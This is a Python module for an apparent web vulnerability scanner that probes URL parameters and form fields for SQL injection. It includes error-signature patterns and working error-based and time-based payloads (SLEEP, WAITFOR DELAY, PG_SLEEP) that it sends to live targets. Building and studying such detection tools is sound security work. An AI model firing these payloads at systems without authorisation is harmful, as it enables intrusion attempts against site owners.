"""
SQLi module - checks error-based and time-based SQLi with robust validation.
This module uses advanced techniques to minimize false positives and improve reliability.
"""
from urllib.parse import urlparse, parse_qs, urlencode
import requests, time, re, statistics
from utils import retry_request

# More specific SQL error signatures to reduce false positives
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql_",
    "mysql_fetch_",
    "mysql_num_rows",
    "table '.+' doesn't exist",
    "unknown column '.+' in 'field list'",
    "duplicate entry '.+' for key",

    # PostgreSQL
    "postgresql query failed",
    "pg_query\\(\\) \\[",
    "pg_exec\\(\\) \\[",
    "query failed: error: relation",

    # MSSQL
    "microsoft ole db provider for odbc drivers",
    "unclosed quotation mark after the character string",
    "microsoft odbc sql server driver",
    "sqlstate.+42000",
    "system\\.data\\.oledb\\.oledbexception",

    # Oracle
    "ora-[0-9]{5}",
    "oracle\\/plsql",
    "quoted string not properly terminated",

    # SQLite
    "sqlite_master",
    "sqlite_temp_master",
    "sql error: near",

    # Generic
    "syntax error.+query",
    "sql command not properly ended",
    "unexpected end of sql command"
]

# Time-based payloads with varying delays for statistical analysis
TIME_BASED_PAYLOADS = [
    {"mysql": "' OR SLEEP(5)--", "delay": 5},
    {"mysql": "1' AND SLEEP(6)--", "delay": 6},
    {"mysql": "') OR SLEEP(4)--", "delay": 4},
    {"mssql": "'; WAITFOR DELAY '0:0:5'--", "delay": 5},
    {"mssql": "1'; WAITFOR DELAY '0:0:6'--", "delay": 6},
    {"postgresql": "'; SELECT PG_SLEEP(5)--", "delay": 5},
    {"postgresql": "1'; SELECT PG_SLEEP(6)--", "delay": 6},
]

# Error-based payloads with better context
ERROR_BASED_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1",
    "' UNION SELECT 1,2,3--",
    "\" UNION SELECT 1,2,3--",
    "' AND 1=CONVERT(int,'a')--",
    "' AND 1=CAST('a' AS INTEGER)--",
]

def measure_baseline_timing(url, session, scanner, iterations=3):
    """Measure baseline response times with statistical analysis"""
    times = []
    parsed = urlparse(url)

    for i in range(iterations):
        try:
            start = time.time()
            resp = retry_request(session.get, url, timeout=10)
            if resp:
                elapsed = time.time() - start
                times.append(elapsed)
        except Exception:
            continue

        time.sleep(scanner.sleep)

    if len(times) < 2:
        return None

    return {
        "mean": statistics.mean(times),
        "median": statistics.median(times),
        "stdev": statistics.stdev(times) if len(times) > 1 else 0,
        "samples": times
    }

def is_sql_error_legitimate(response_text, payload):
    """Check if SQL error is legitimate and not just coincidental"""
    if not response_text:
        return False

    response_lower = response_text.lower()

    # Check for actual SQL error patterns
    error_found = False
    for signature in SQL_ERROR_SIGNATURES:
        if re.search(signature, response_lower, re.IGNORECASE):
            error_found = True
            break

    if not error_found:
        return False

    # Verify the error isn't just generic application error
    generic_errors = [
        "404 not found",
        "403 forbidden",
        "500 internal server error",
        "bad request",
        "page not found"
    ]

    for generic in generic_errors:
        if generic in response_lower:
            return False

    # Check if payload characters appear near the error
    payload_chars = set(payload.lower())
    sql_chars = {"'", '"', '-', ';', '(', ')', '='}

    if payload_chars.intersection(sql_chars):
        # Look for SQL-specific error context
        sql_contexts = [
            "syntax", "query", "statement", "column", "table",
            "database", "select", "union", "where", "from"
        ]

        for context in sql_contexts:
            if context in response_lower:
                return True

    return False

def analyze_time_based_response(baseline, test_times, expected_delay):
    """Analyze timing to determine if delay is due to SQL injection"""
    if not baseline or not test_times:
        return False

    baseline_mean = baseline["mean"]
    baseline_stdev = baseline["stdev"]

    # Calculate statistical significance
    test_mean = statistics.mean(test_times)

    # The delay should be close to expected delay
    actual_delay = test_mean - baseline_mean

    # Must be at least 70% of expected delay to account for network variance
    min_expected = expected_delay * 0.7
    max_expected = expected_delay * 1.5  # Allow some variance

    if min_expected <= actual_delay <= max_expected:
        # Check if delay is statistically significant
        threshold = baseline_mean + (3 * baseline_stdev) + 1.0
        if test_mean > threshold:
            return True

    return False

def param_test(url, param, session, scanner):
    """Test parameter for SQLi with robust validation"""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    base = url.split('?', 1)[0]

    # Test error-based first
    for payload in ERROR_BASED_PAYLOADS:
        qs[param] = payload
        query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
        test_url = base + "?" + query

        if scanner._is_denied(test_url):
            continue

        try:
            resp = retry_request(session.get, test_url, timeout=15)
            if resp and is_sql_error_legitimate(resp.text, payload):
                # Verify with a second payload
                verify_payload = "' AND 1=2 UNION SELECT 1--"
                qs[param] = verify_payload
                verify_query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
                verify_url = base + "?" + verify_query

                verify_resp = retry_request(session.get, verify_url, timeout=15)
                if verify_resp and is_sql_error_legitimate(verify_resp.text, verify_payload):
                    return {
                        "host": scanner.root,
                        "endpoint": test_url,
                        "vul_type": "SQL Injection (Error-based)",
                        "param": param,
                        "payload": payload,
                        "details": "Confirmed SQL error signatures in response",
                        "request_raw": f"GET {test_url} HTTP/1.1\n",
                        "response_raw": resp.text[:1000],
                        "short_desc": "SQL injection confirmed via error messages",
                        "mitigation": "Use parameterized queries and input validation",
                        "confidence": "High"
                    }
        except Exception:
            pass

        time.sleep(scanner.sleep)

    # Test time-based if error-based didn't work
    baseline = measure_baseline_timing(url, session, scanner)
    if not baseline:
        return None

    for payload_info in TIME_BASED_PAYLOADS[:4]:  # Limit tests to avoid noise
        for db_type, payload in payload_info.items():
            if db_type == "delay":
                continue

            expected_delay = payload_info["delay"]
            qs[param] = payload
            query = "&".join(f"{k}={requests.utils.quote(str(v))}" for k, v in qs.items())
            test_url = base + "?" + query

            if scanner._is_denied(test_url):
                continue

            # Test multiple times for statistical significance
            test_times = []

            for i in range(2):  # Test twice
                try:
                    start = time.time()
                    resp = retry_request(session.get, test_url, timeout=expected_delay + 10)
                    elapsed = time.time() - start
                    test_times.append(elapsed)
                except Exception:
                    continue

                time.sleep(scanner.sleep)

            if analyze_time_based_response(baseline, test_times, expected_delay):
                avg_time = statistics.mean(test_times)
                return {
                    "host": scanner.root,
                    "endpoint": test_url,
                    "vul_type": "SQL Injection (Time-based)",
                    "param": param,
                    "payload": payload,
                    "details": f"Response time: {avg_time:.2f}s, Baseline: {baseline['mean']:.2f}s, Expected delay: {expected_delay}s",
                    "request_raw": f"GET {test_url} HTTP/1.1\n",
                    "response_raw": "Time-based detection - response content not relevant",
                    "short_desc": "Blind SQL injection confirmed via timing analysis",
                    "mitigation": "Use parameterized queries and disable time functions",
                    "confidence": "High"
                }

    return None

def form_test(form, session, scanner):
    """Test form fields for SQLi with robust validation"""
    for field in list(form.get("inputs", {}).keys())[:4]:  # Limit fields tested

        # Test error-based
        for payload in ERROR_BASED_PAYLOADS[:3]:  # Limit payloads
            data = {k: (payload if k == field else v) for k, v in form.get("inputs", {}).items()}

            try:
                if form.get("method", "GET").upper() == "POST":
                    resp = retry_request(session.post, form["action"], data=data, timeout=15)
                else:
                    resp = retry_request(session.get, form["action"], params=data, timeout=15)

                if resp and is_sql_error_legitimate(resp.text, payload):
                    return {
                        "host": scanner.root,
                        "endpoint": form["action"],
                        "vul_type": "SQL Injection (Form Error-based)",
                        "param": field,
                        "payload": payload,
                        "details": "SQL error signature in form response",
                        "request_raw": f"FORM {form['action']} DATA: {data}",
                        "response_raw": resp.text[:1000],
                        "short_desc": "SQL injection via form field",
                        "mitigation": "Use parameterized queries for form processing",
                        "confidence": "High"
                    }
            except Exception:
                pass

            time.sleep(scanner.sleep)

    return None

def register():
    return {
        "name": "sqli",
        "param_test": param_test,
        "form_test": form_test,
        "description": "Advanced SQL injection detection with statistical timing analysis"
    }
